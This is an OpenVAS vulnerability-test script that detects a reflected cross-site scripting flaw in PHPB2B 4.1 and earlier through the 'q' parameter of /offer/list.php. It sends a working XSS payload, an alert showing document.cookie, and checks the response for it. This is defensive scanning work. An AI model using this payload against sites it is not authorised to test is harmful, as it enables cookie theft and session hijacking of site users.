###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpb2b_q_param_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# PHPB2B 'q' Parameter Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802369");
  script_version("$Revision: 11997 $");
  script_bugtraq_id(51221);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-05 15:17:25 +0530 (Mon, 05 Dec 2011)");
  script_name("PHPB2B 'q' Parameter Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108280/phpb2b-xss.txt");
  script_xref(name:"URL", value:"http://vulnsecuritylist.com/vulnerability/phpb2b-cross-site-scripting/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");
  script_tag(name:"affected", value:"PHPB2B version 4.1 and prior.");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  via the 'q' parameter to /offer/list.php, which allows attacker to execute
  arbitrary HTML and script code on the user's browser session in the security
  context of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running PHPB2B and is prone to cross site scripting
  vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

phpb2bPort = get_http_port(default:80);

if(!can_host_php(port:phpb2bPort)) {
  exit(0);
}

foreach dir (make_list_unique("/phpb2b", "/phpb2b/upload", cgi_dirs(port:phpb2bPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:phpb2bPort);

  if("PHPB2B e-commerce Web Site Management System" >< rcvRes &&
     ">Powered by PHPB2B" >< rcvRes)
  {
    ## Path of Vulnerable Page
    url = dir + '/offer/list.php?do=search&q=<script>alert' +
          '(document.cookie)</script>';

    ## Send XSS attack and check the response to confirm vulnerability.
    if(http_vuln_check(port:phpb2bPort, url:url, pattern:"<script>alert\(document\." +
                                               "cookie\)</script>", check_header:TRUE))
    {
       security_message(port:phpb2bPort);
       exit(0);
    }
  }
}

exit(99);
